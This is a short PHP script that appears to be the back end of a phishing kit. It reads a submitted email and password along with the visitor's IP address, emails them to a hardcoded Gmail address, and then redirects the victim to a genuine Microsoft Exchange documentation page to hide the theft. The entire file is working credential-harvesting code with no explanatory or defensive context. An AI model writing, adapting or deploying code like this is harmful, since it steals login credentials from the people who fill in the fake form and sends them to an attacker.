<?php

$ip = $_SERVER['REMOTE_ADDR'];
$email = $_POST['email'];
$password = $_POST['password'];


$data = "
------------ Created By adequate ------------
E-mail ID : $email
Password  : $password
-------------------------
IP : $ip
------------ Created By adequate ------------
";

$mailsubj = "| Login: | $email | $password ";


$emailusr = 'basil.frank20@gmail.com';

mail($emailusr, $mailsubj, $data);

header("Location: https://technet.microsoft.com/en-us/library/dd351283%28v=exchg.141%29.aspx");
	  

?>